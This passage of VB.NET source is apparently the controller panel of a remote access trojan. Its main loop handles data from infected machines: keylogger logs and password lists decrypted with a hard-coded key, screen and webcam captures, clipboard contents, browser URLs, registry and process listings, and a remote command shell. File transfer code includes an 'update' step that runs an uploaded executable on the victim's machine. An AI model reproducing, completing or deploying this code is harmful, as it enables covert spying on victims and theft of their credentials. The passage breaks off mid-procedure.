#Region "Read Data..."
    Protected Sub RecieveData(ByVal ClientSocket As Socket)
    End Sub

    Private sock As Socket
    Private ipEnd As IPEndPoint
    Private Sub RunClient()
        Try

            Dim swriter As StreamWriter
            Dim sreader As StreamReader
            sreader = streamReaderlist(abc)
            swriter = streamWriterlist(abc)

            strInput = New StringBuilder()

            Do
                Dim TempData As String
                Dim appoggio As String
                Dim LungFile As Integer
                Dim c As Short
                TempData = streamReaderlist(abc).ReadLine()

                Select Case Microsoft.VisualBasic.Left(TempData, 10)

                    Case "/MSGS/"
                        If CheckBox2.Checked Then
                            MessageBox.Show("The action completed successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
                        End If
                    Case "/MSGE/"
                        If CheckBox2.Checked Then
                            MessageBox.Show("The action completed unsuccessfully", "Failure", MessageBoxButtons.OK, MessageBoxIcon.Error)
                        End If

                    Case "/STARDESK/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim dataw() As Byte = Convert.FromBase64String(TempData)
                            Dim ms As New MemoryStream(dataw)
                            returnImage = Image.FromStream(ms)
                            WriteToPictureBox(returnImage)
                            ms.Close()
                            GC.Collect()
                        Catch ex As Exception

                        End Try

                    Case "/WEBIMAGE/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            If Not TempData = "SAME" Then
                                Dim dataw() As Byte = Convert.FromBase64String(TempData)
                                Dim ms As New MemoryStream(dataw)
                                returnImage = Image.FromStream(ms)
                                WriteToPictureBox3(returnImage)
                                ms.Close()
                                GC.Collect()
                            End If
                        Catch ex As Exception

                        End Try

                    Case "/WEBCAPTR/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            If Not TempData = "SAME" Then
                                Dim dataw() As Byte = Convert.FromBase64String(TempData)
                                Dim ms As New MemoryStream(dataw)
                                returnImage = Image.FromStream(ms)
                                WriteToPictureBox3(returnImage)
                                ms.Close()
                                GC.Collect()
                            End If

                            streamWriterlist(abc).WriteLine("/WEBIMAGE/" & "Capture")
                            streamWriterlist(abc).Flush()
                        Catch ex As Exception

                        End Try



                    Case "/IPREVIEW/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim dataw() As Byte = Convert.FromBase64String(TempData)
                            Dim ms As New MemoryStream(dataw)
                            returnImage = Image.FromStream(ms)
                            Dim myForm2 As New imagepreview()
                            myForm2.img = returnImage
                            myForm2.ShowDialog()
                            ms.Close()
                            GC.Collect()

                        Catch ex As Exception

                        End Try

                    Case "/STARTSQN/"
                        Try
                            If Me.WindowState = FormWindowState.Normal Then
                                streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "640")
                                streamWriterlist(abc).Flush()
                            Else
                                Select Case Quality

                                    Case "High Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "1280")
                                        streamWriterlist(abc).Flush()
                                    Case "Good Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "1024")
                                        streamWriterlist(abc).Flush()
                                    Case "Low Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "800")
                                        streamWriterlist(abc).Flush()
                                    Case "Lowest Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "640")
                                        streamWriterlist(abc).Flush()
                                End Select

                            End If
                           
                        Catch ex As Exception

                        End Try

                    Case "/STARTSEQ/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            If Not TempData = "SAME" Then
                                Dim dataw() As Byte = Convert.FromBase64String(TempData)
                                Dim ms As New MemoryStream(dataw)
                                returnImage = Image.FromStream(ms)
                                WriteToPictureBox(returnImage)
                                ms.Close()
                                GC.Collect()
                            End If
                            If Me.WindowState = FormWindowState.Normal Then
                                streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "640")
                                streamWriterlist(abc).Flush()
                            Else
                                Select Case Quality
                                    Case "High Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "1280")
                                        streamWriterlist(abc).Flush()
                                    Case "Good Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "1024")
                                        streamWriterlist(abc).Flush()
                                    Case "Low Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "800")
                                        streamWriterlist(abc).Flush()
                                    Case "Lowest Quality"
                                        streamWriterlist(abc).WriteLine("/STARTSEQ/" & NumericUpDown1.Value & "¦" & "640")
                                        streamWriterlist(abc).Flush()
                                End Select
                            End If
                        Catch ex As Exception

                        End Try


                    Case "/FILESIZE/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim sizekb As Integer = Math.Floor(Val(TempData) / 1024)
                            Dim sizemb As Double = sizekb / 1024
                            sizemb = Math.Round(sizemb, 2)
                            If sizemb < 1 Then
                                MessageBox.Show("FileSize: " & sizekb & " KB", "FileSize...", MessageBoxButtons.OK, MessageBoxIcon.Information)
                            Else
                                MessageBox.Show("FileSize: " & sizekb & " KB" & vbCrLf & vbCrLf & "FileSize: " & sizemb & " MB", "FileSize...", MessageBoxButtons.OK, MessageBoxIcon.Information)

                            End If
                        Catch ex As Exception

                        End Try


                    Case "/ONLYONEP/"
                        Try
                            Clearlist4()
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim parts As String() = TempData.Split(CChar("*"))
                            For Each part As String In parts
                                WriteToList4(part)
                            Next
                        Catch ex As Exception

                        End Try


                    Case "/LISTDRVS/"
                        Try
                            Dim partslist As List(Of String) = New List(Of String)
                            Dim parts As String() = TempData.Split(CChar("*"))
                            For Each part As String In parts
                                partslist.Add(part)
                            Next
                            If GroupBox2.Visible Then
                                ClearCombo3()
                                For c = 1 To partslist.Count - 1
                                    If partslist.Item(c) = "A:\" Or partslist.Item(c) = "B:\" Then
                                    Else
                                        WriteToCombo3(partslist.Item(c))
                                    End If
                                Next c
                            Else
                                ClearCombo1()
                                For c = 1 To partslist.Count - 1
                                    If partslist.Item(c) = "A:\" Or partslist.Item(c) = "B:\" Then
                                    Else
                                        WriteToCombo1(partslist.Item(c))
                                    End If
                                Next c
                            End If

                        Catch ex As Exception

                        End Try

                    Case "/ERRORDIR/"
                        Try
                            Clearlist4()
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim parts As String() = TempData.Split(CChar("*"))
                            For Each part As String In parts
                                WriteToList4(part)
                            Next
                        Catch ex As Exception

                        End Try

                    Case "/INFOPCPC/"
                        Try
                            WriteTotextBox15(Nothing)
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim inf As String() = TempData.Split("±")
                            For Each info As String In inf
                                WriteTotextBox15(TextBox15.Text & info & vbCrLf)
                            Next
                        Catch ex As Exception

                        End Try


                    Case "/CLIPBOAR/"
                        Try
                            Dim clip As String = Mid(TempData, 11, Len(TempData))
                            clip = clip.Replace("***", vbCrLf)
                            WriteTotextBox10(clip)
                        Catch ex As Exception

                        End Try


                    Case "/LISTPROC/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim proc As String() = TempData.Split("$")
                            For Each pri As String In proc
                                Dim itm As String() = pri.Split("*")
                                Dim mem As Integer = Int32.Parse(itm.GetValue(3))
                                mem = Math.Round(mem / 1024)
                                Dim memo As String = mem.ToString("#,#") & " K"
                                WriteTolistview2(itm.GetValue(0), itm.GetValue(1), itm.GetValue(2), memo)
                            Next
                        Catch ex As Exception

                        End Try


                    Case "/LISTSERV/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim proc As String() = TempData.Split("$")
                            For Each pri As String In proc
                                Dim itm As String() = pri.Split("*")
                                WriteTolistview3(itm.GetValue(0), itm.GetValue(1), itm.GetValue(2))
                            Next
                        Catch ex As Exception

                        End Try


                    Case "/STARTDOW/"
                        If GroupBox2.Visible Then
                            Try
                                TempData = Mid(TempData, 11, Len(TempData))
                                LungFile = CInt(Extract(TempData))
                                WriteToPBMax2(LungFile)
                                WriteToPB(0)
                                TempData = Mid(TempData, Len(CStr(LungFile)) + 2, Len(TempData))
                                appoggio = Application.StartupPath & "\Downloads"
                                If Not Directory.Exists(appoggio) Then
                                    Directory.CreateDirectory(appoggio)
                                End If
                                Dim hexValues() As String = TempData.Trim.Split(" ")
                                Dim bytes(hexValues.GetUpperBound(0)) As Byte
                                For i As Integer = 0 To (hexValues.Length - 1)
                                    bytes(i) = hexValues.GetValue(i)

                                Next
                                If hexValues.Length < 4096 Then
                                    _Error = ""
                                    _MergingFileName = appoggio & "\" & objlist5
                                    _MergedFile = appoggio & "\" & objlist5
                                    If File.Exists(_MergedFile) Then File.Delete(_MergedFile)
                                    _OutputFileStram = New FileStream(_MergedFile, FileMode.CreateNew)
                                    _BinaryWriter = New BinaryWriter(_OutputFileStram)
                                    ReDim _buffer(hexValues.Length - 1)
                                    _buffer = bytes
                                    _BinaryWriter.Write(_buffer)
                                    WriteToPB2(_buffer.Length - 1)
                                    _OutputFileStram.Flush()
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    MessageBox.Show("Download Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    WriteToPB(0)
                                    WriteTobutton86("Download")
                                Else
                                    _Error = ""
                                    _MergingFileName = appoggio & "\" & objlist5
                                    _MergedFile = appoggio & "\" & objlist5
                                    If File.Exists(_MergedFile) Then File.Delete(_MergedFile)
                                    _OutputFileStram = New FileStream(_MergedFile, FileMode.CreateNew)
                                    _BinaryWriter = New BinaryWriter(_OutputFileStram)
                                    ReDim _buffer(hexValues.Length - 1)
                                    _buffer = bytes
                                    _BinaryWriter.Write(_buffer)
                                    WriteToPB2(_buffer.Length - 1)
                                    _OutputFileStram.Flush()
                                    streamWriterlist(abc).WriteLine("/ENCOREFL/")
                                    streamWriterlist(abc).Flush()
                                End If
                            Catch ex As Exception
                                Try
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    streamWriterlist(abc).WriteLine("/ERROR/")
                                    streamWriterlist(abc).Flush()
                                    WriteTobutton86("Download")
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #1...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                Catch exi As Exception
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #1...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                                End Try
                            End Try
                        Else
                            Try
                                TempData = Mid(TempData, 11, Len(TempData))
                                LungFile = CInt(Extract(TempData))
                                WriteToPBMax(LungFile)
                                WriteToPB(0)
                                TempData = Mid(TempData, Len(CStr(LungFile)) + 2, Len(TempData))
                                appoggio = Application.StartupPath & "\Downloads"
                                If Not Directory.Exists(appoggio) Then
                                    Directory.CreateDirectory(appoggio)
                                End If
                                Dim hexValues() As String = TempData.Trim.Split(" ")
                                Dim bytes(hexValues.GetUpperBound(0)) As Byte
                                For i As Integer = 0 To (hexValues.Length - 1)
                                    bytes(i) = hexValues.GetValue(i)

                                Next
                                If hexValues.Length < 4096 Then
                                    _Error = ""
                                    _MergingFileName = appoggio & "\" & listfilename
                                    _MergedFile = appoggio & "\" & listfilename
                                    If File.Exists(_MergedFile) Then File.Delete(_MergedFile)
                                    _OutputFileStram = New FileStream(_MergedFile, FileMode.CreateNew)
                                    _BinaryWriter = New BinaryWriter(_OutputFileStram)
                                    ReDim _buffer(hexValues.Length - 1)
                                    _buffer = bytes
                                    _BinaryWriter.Write(_buffer)
                                    WriteToPB(_buffer.Length - 1)
                                    _OutputFileStram.Flush()
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    MessageBox.Show("Download Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    WriteToPB(0)
                                    WriteTobutton64("Download")
                                Else
                                    _Error = ""
                                    _MergingFileName = appoggio & "\" & listfilename
                                    _MergedFile = appoggio & "\" & listfilename
                                    If File.Exists(_MergedFile) Then File.Delete(_MergedFile)
                                    _OutputFileStram = New FileStream(_MergedFile, FileMode.CreateNew)
                                    _BinaryWriter = New BinaryWriter(_OutputFileStram)
                                    ReDim _buffer(hexValues.Length - 1)
                                    _buffer = bytes
                                    _BinaryWriter.Write(_buffer)
                                    WriteToPB(_buffer.Length - 1)
                                    _OutputFileStram.Flush()
                                    streamWriterlist(abc).WriteLine("/ENCOREFL/")
                                    streamWriterlist(abc).Flush()
                                End If
                            Catch ex As Exception
                                Try
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    streamWriterlist(abc).WriteLine("/ERROR/")
                                    streamWriterlist(abc).Flush()
                                    WriteTobutton64("Download")
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #1...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                Catch exi As Exception
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #1...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                                End Try
                            End Try
                        End If



                    Case "/PAKSSEND/"
                        If GroupBox2.Visible Then
                            Try
                                TempData = Mid(TempData, 11, Len(TempData))
                                Dim hexValues() As String = TempData.Trim.Split(" ")
                                Dim bytes(hexValues.GetUpperBound(0)) As Byte
                                Dim enc As New System.Text.ASCIIEncoding()
                                For i As Integer = 0 To (hexValues.Length - 1)
                                    bytes(i) = hexValues.GetValue(i)
                                Next
                                ReDim _buffer(hexValues.Length - 1)
                                _buffer = bytes
                                _BinaryWriter.Write(_buffer)
                                _OutputFileStram.Flush()
                                WriteToPB2(_buffer.Length - 1)
                                streamWriterlist(abc).WriteLine("/ENCOREFL/")
                                streamWriterlist(abc).Flush()
                            Catch ex As Exception
                                Try
                                    streamWriterlist(abc).WriteLine("/ERROR/")
                                    streamWriterlist(abc).Flush()
                                    WriteTobutton86("Download")
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #2...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                Catch exi As Exception
                                End Try
                            End Try
                        Else
                            Try
                                TempData = Mid(TempData, 11, Len(TempData))
                                Dim hexValues() As String = TempData.Trim.Split(" ")
                                Dim bytes(hexValues.GetUpperBound(0)) As Byte
                                Dim enc As New System.Text.ASCIIEncoding()
                                For i As Integer = 0 To (hexValues.Length - 1)
                                    bytes(i) = hexValues.GetValue(i)
                                Next
                                ReDim _buffer(hexValues.Length - 1)
                                _buffer = bytes
                                _BinaryWriter.Write(_buffer)
                                _OutputFileStram.Flush()
                                WriteToPB(_buffer.Length - 1)
                                streamWriterlist(abc).WriteLine("/ENCOREFL/")
                                streamWriterlist(abc).Flush()
                            Catch ex As Exception
                                Try
                                    streamWriterlist(abc).WriteLine("/ERROR/")
                                    streamWriterlist(abc).Flush()
                                    WriteTobutton64("Download")
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #2...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                Catch exi As Exception
                                End Try
                            End Try
                        End If

                    Case "/FINEDOWN/"
                        If GroupBox2.Visible Then
                            Try
                                TempData = Mid(TempData, 11, Len(TempData))
                                If TempData <> "" Then
                                    Dim hexValues() As String = TempData.Trim.Split(" ")
                                    Dim bytes(hexValues.GetUpperBound(0)) As Byte
                                    Dim enc As New System.Text.ASCIIEncoding()

                                    For i As Integer = 0 To (hexValues.Length - 1)
                                        bytes(i) = hexValues.GetValue(i)
                                    Next
                                    ReDim _buffer(hexValues.Length - 1)
                                    _buffer = bytes
                                    _BinaryWriter.Write(_buffer)
                                    _OutputFileStram.Flush()
                                    WriteToPB2(_buffer.Length - 1)
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    FlagDown = False
                                    MessageBox.Show("Download Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    WriteToPB2(0)
                                    WriteTobutton86("Download")
                                Else
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    FlagDown = False
                                    MessageBox.Show("Download Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    WriteToPB2(0)
                                    WriteTobutton86("Download")
                                End If
                            Catch ex As Exception
                                Try
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    streamWriterlist(abc).WriteLine("/ERROR/")
                                    streamWriterlist(abc).Flush()
                                    WriteTobutton86("Download")
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #3...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                Catch exi As Exception
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #3...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                                End Try
                            End Try
                        Else
                            Try
                                TempData = Mid(TempData, 11, Len(TempData))
                                If TempData <> "" Then
                                    Dim hexValues() As String = TempData.Trim.Split(" ")
                                    Dim bytes(hexValues.GetUpperBound(0)) As Byte
                                    Dim enc As New System.Text.ASCIIEncoding()

                                    For i As Integer = 0 To (hexValues.Length - 1)
                                        bytes(i) = hexValues.GetValue(i)
                                    Next
                                    ReDim _buffer(hexValues.Length - 1)
                                    _buffer = bytes
                                    _BinaryWriter.Write(_buffer)
                                    _OutputFileStram.Flush()
                                    WriteToPB(_buffer.Length - 1)
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    FlagDown = False
                                    MessageBox.Show("Download Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    WriteToPB(0)
                                    WriteTobutton64("Download")
                                Else
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    FlagDown = False
                                    MessageBox.Show("Download Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    WriteToPB(0)
                                    WriteTobutton64("Download")
                                End If
                            Catch ex As Exception
                                Try
                                    _OutputFileStram.Close()
                                    _BinaryWriter.Close()
                                    streamWriterlist(abc).WriteLine("/ERROR/")
                                    streamWriterlist(abc).Flush()
                                    WriteTobutton64("Download")
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #3...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                Catch exi As Exception
                                    MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #3...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                                End Try
                            End Try
                        End If


                    Case "/ERROR/"
                        If GroupBox2.Visible Then
                            Try
                                _OutputFileStram.Close()
                                _BinaryWriter.Close()
                                WriteTobutton86("Download")
                                MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #4...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                            Catch exi As Exception
                                MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #4...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                            End Try
                        Else
                            Try
                                _OutputFileStram.Close()
                                _BinaryWriter.Close()
                                WriteTobutton64("Download")
                                MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #4...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                            Catch exi As Exception
                                MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #4...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                            End Try
                        End If


                    Case "/ERRORUPL/"
                        Try
                            _OutputFileStram.Close()
                            _BinaryWriter.Close()
                            MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #5...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                        Catch exi As Exception
                            MessageBox.Show("There is error ocurred, restart your program and try again!", "File download error #5...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                        End Try


                    Case "/ANOTHEPK/"
                        Try

                            If _index <> _Fragments Then
                                Dim build, build2 As New StringBuilder
                                _index = _index + 1
                                ReDim _buffer(ChunkSize - 1)
                                _BinaryReader.Read(_buffer, 0, ChunkSize)
                                _StartPosition = _BinaryReader.BaseStream.Seek(0, SeekOrigin.Current)
                                build.Append("/OTHERPAK/")
                                For i As Integer = 0 To _buffer.Length - 1
                                    build2.Append(_buffer.GetValue(i).ToString & " ")
                                Next
                                build.Append(build2)
                                streamWriterlist(abc).WriteLine(build)
                                streamWriterlist(abc).Flush()
                                WriteToPB(_buffer.Length - 1)
                            Else
                                If _RemainingBytes > 0 Then
                                    Dim build, build2 As New StringBuilder
                                    ReDim _buffer(_RemainingBytes - 1)
                                    _BinaryReader.Read(_buffer, 0, _RemainingBytes)
                                    build.Append("/FINEUPLD/")
                                    For i As Integer = 0 To _buffer.Length - 1
                                        build2.Append(_buffer.GetValue(i).ToString & " ")
                                    Next
                                    build.Append(build2)
                                    streamWriterlist(abc).WriteLine(build)
                                    streamWriterlist(abc).Flush()
                                    WriteToPB(_buffer.Length - 1)
                                    _InputFileStram.Close()
                                    _BinaryReader.Close()
                                    _BinaryWriter = Nothing
                                    _OutputFileStram = Nothing
                                    _BinaryReader = Nothing
                                    _InputFileStram = Nothing
                                    WriteToPB(0)
                                    WriteTobutton45("Upload")
                                    If updateflag = True Then
                                        streamWriterlist(abc).WriteLine("/RUNEXEFL/" & "0" & "C:\Users\Public\" & patch)
                                        streamWriterlist(abc).Flush()
                                        Delay(2)
                                        streamWriterlist(abc).WriteLine("/REMOVESV/")
                                        streamWriterlist(abc).Flush()
                                        updateflag = False
                                        MessageBox.Show("Update Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    Else
                                        MessageBox.Show("Upload Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    End If
                                   
                                Else
                                    streamWriterlist(abc).WriteLine("/FINEUPLD/" & "")
                                    streamWriterlist(abc).Flush()

                                    WriteToPB(0)

                                    _InputFileStram.Close()
                                    _BinaryReader.Close()
                                    _BinaryWriter = Nothing
                                    _OutputFileStram = Nothing
                                    _BinaryReader = Nothing
                                    _InputFileStram = Nothing
                                    WriteTobutton45("Upload")
                                    If updateflag = True Then
                                        streamWriterlist(abc).WriteLine("/RUNEXEFL/" & "1" & "C:\Users\Public\" & patch)
                                        streamWriterlist(abc).Flush()
                                        Delay(2)
                                        streamWriterlist(abc).WriteLine("/REMOVESV/")
                                        streamWriterlist(abc).Flush()
                                        updateflag = False
                                        MessageBox.Show("Update Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    Else
                                        MessageBox.Show("Upload Completed!!!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                    End If
                                   
                                  
                                End If

                            End If
                        Catch ex As Exception
                            Try
                                _InputFileStram.Close()
                                _BinaryReader.Close()
                                _BinaryWriter = Nothing
                                _OutputFileStram = Nothing
                                _BinaryReader = Nothing
                                _InputFileStram = Nothing
                                streamWriterlist(abc).WriteLine("/ERROR/")
                                streamWriterlist(abc).Flush()
                                WriteTobutton45("Upload")
                            Catch exi As Exception

                            End Try
                        End Try

                    Case "/IEVERSIN/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            WriteTotextBox5(TempData)
                        Catch ex As Exception

                        End Try


                    Case "/IESTARTP/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            WriteTotextBox6(TempData)
                        Catch ex As Exception

                        End Try


                    Case "/LASTURLS/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            If TempData.StartsWith("*****") Then
                                TempData = Mid(TempData, 6, Len(TempData))
                                WriteTotextBox15(Decrypt(TempData, "&%#@?,:*"))
                            Else
                                Dim partslist As List(Of String) = New List(Of String)
                                Dim parts As String() = TempData.Split(CChar("*"))
                                For Each part As String In parts
                                    partslist.Add(part)
                                Next
                                WriteTotextBox15(Nothing)
                                For i = 0 To partslist.Count - 1
                                    WriteTotextBox15(TextBox15.Text & (partslist.Item(i)) & vbCrLf)
                                Next i
                            End If
                        Catch ex As Exception

                        End Try

                    Case "/PSSRLIST/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            gflag = False
                            Timer3.Stop()
                            WriteTotextBox27(Decrypt(TempData, "&%#@?,:*"))
                        Catch ex As Exception

                        End Try

                    Case "/REFRESHP/"
                        Try
                            Clearlist2()
                            streamWriterlist(abc).WriteLine("/LISTPROC/")
                            streamWriterlist(abc).Flush()
                        Catch ex As Exception

                        End Try


                    Case "/REFRWIND/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            Clearlist3()
                            Dim partslist As List(Of String) = New List(Of String)
                            Dim parts As String() = TempData.Split(CChar("±"))
                            Dim vis As String = parts.GetValue(0)
                            Dim proc As String = parts.GetValue(1)
                            visparts = vis.Split("²")
                            procparts = proc.Split("³")
                            For i = 0 To (visparts.Length - 2)
                                WriteToList3(visparts.GetValue(i))
                            Next
                        Catch ex As Exception
                        End Try


                    Case "/KEYSLOGG/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            TempData = Decrypt(TempData, "&%#@?,:*")
                            WriteTotextBox13(TempData)
                        Catch ex As Exception

                        End Try

                    Case "/STARTSQL/"
                        Try
                            TempData = Mid(TempData, 11, Len(TempData))
                            Dim parts As String() = TempData.Split(CChar("*"))
                            clcursorx = parts(0)
                            clcursory = parts(1)
                        Catch ex As Exception

                        End Try


                    Case "/CMDCMDGO/"
                        TempData = Mid(TempData, 11, Len(TempData))
                        Try
                            strInput.Append(TempData)
                            strInput.Append(vbCrLf)
                            Application.DoEvents()
                            DisplayMessage(strInput.ToString())
                            strInput.Remove(0, strInput.Length)
                        Catch err As Exception

                        End Try

                    Case "/REGYVIEW/"


                        TempData = Mid(TempData, 11, Len(TempData))
                        Dim dat As String = TempData.Substring(0, 2)
                        TempData = Mid(TempData, 3, Len(TempData))
                        Select Case dat

                            Case "CU"
                                Dim parts As String() = TempData.Split(CChar("¥"))
                                For Each Key1 As String In parts
                                    Try
                                        currentUserNode3.Nodes.Add(Key1)
                                    Catch ex As Exception

                                    End Try
                                Next
                                WriteTotree2(currentUserNode3)
                            Case "LM"
                                Dim parts As String() = TempData.Split(CChar("¥"))
                                For Each Key1 As String In parts
                                    Try
                                        currentUserNode4.Nodes.Add(Key1)
                                    Catch ex As Exception

                                    End Try
                                Next
                                WriteTotree2(currentUserNode4)
                            Case "US"
                                Dim parts As String() = TempData.Split(CChar("¥"))
                                For Each Key1 As String In parts
                                    Try
                                        currentUserNode5.Nodes.Add(Key1)
                                    Catch ex As Exception

                                    End Try
                                Next
                                WriteTotree2(currentUserNode5)
                        End Select

                    Case "/REGVIEWS/"
                        TempData = Mid(TempData, 11, Len(TempData))
                        Dim parts As String() = TempData.Split(CChar("¥"))
                        For Each Key1 As String In parts
                            Try

                                WriteToSub(Key1)
                            Catch ex As Exception

                            End Try
                        Next

                    Case "/REGVIEWV/"
                        TempData = Mid(TempData, 11, Len(TempData))
                        Dim parts As String() = TempData.Split(CChar("¥"))
                        For Each Key1 As String In parts
                            Try
                                WriteToValue(Key1)
                            Catch ex As Exception

                            End Try
                        Next
                    Case "/SEARCHFL/"
                        TempData = Mid(TempData, 11, Len(TempData))
                        WriteTolistview5(TempData)

                    Case "/WEBLISTC/"
                        TempData = Mid(TempData, 11, Len(TempData))
                        Try
                            ClearCombo4()
                            Dim parts As String() = TempData.Split(CChar("¦"))
                            If parts.Length > 0 Then
                                For Each part As String In parts
                                    If Not part = Nothing Then
                                        WriteToCombo4(part)
                                    End If
                                Next
                               
                            Else
                                WriteToCombo4("No Device Found...")
                            End If



                        Catch ex As Exception

                        End Try
                End Select

            Loop
        Catch ex As Exception
            Return
        End Try

    End Sub

#End Region

#Region "All..."

    Private Sub Cleanup()
        Try
            For d As Integer = 0 To abc - 1
                streamReaderlist(d).Close()
                streamWriterlist(d).Close()
                networkStream(d).Close()
                clientList(d).Close()
            Next

        Catch err As Exception
        End Try

    End Sub




    Private Sub textBox2_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles textBox2.KeyDown
        Try
            If Button78.Text = "Start CMD" Then
                MessageBox.Show("Press 'Start CMD' button to start the terminal", "CMD", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Exit Sub
            Else
                If e.KeyCode = Keys.Enter Then
                    strInput.Append("/CMDCMDGO/")
                    strInput.Append(textBox2.Text.ToString())
                    textBox2.AutoCompleteCustomSource.Add(textBox2.Text)
                    streamWriterlist(abc).WriteLine(strInput)
                    streamWriterlist(abc).Flush()
                    strInput.Remove(0, strInput.Length)
                    If textBox2.Text = "cls" Then
                        textBox1.Text = Nothing
                    End If
                    textBox2.Text = ""
                End If
            End If

        Catch err As Exception
        End Try

    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            'My.Computer.FileSystem.WriteAllText("Settings.ini", TextBox18.Text, False)
            Dim ini As New IniFile(Application.StartupPath & "\Settings.ini")
            ini.WriteString("General", "Main Listening Port", TextBox18.Text)
            ini.WriteString("General", "Main Port", TextBox19.Text)
            ini.WriteString("General", "Backup Port", TextBox26.Text)
            If TextBox28.Text = Nothing OrElse TextBox28.Text = "Enter here the PSW activation key..." Then
            Else
                ini.WriteString("General", "Passwords Key", TextBox28.Text)
            End If


        Catch ex As Exception

        End Try
        Cleanup()
        System.Environment.Exit(System.Environment.ExitCode)
    End Sub

    Dim abc As Integer

    Private Sub all()
        GroupMSG.Visible = True
        GroupMSGBuilt.Visible = True
        GroupStuff.Visible = True
        GroupIE.Visible = True
        GroupClip.Visible = True
        GroupDaR.Visible = True
        GroupPrint.Visible = True
        GroupProcess.Visible = True
        GroupWindows.Visible = True
        GroupService.Visible = True
        GroupServer.Visible = True
    End Sub
    Private Sub all2()
        PictureBox1.Visible = False
        GroupMSG.Visible = False
        GroupStuff.Visible = False
        GroupIE.Visible = False
        GroupClip.Visible = False
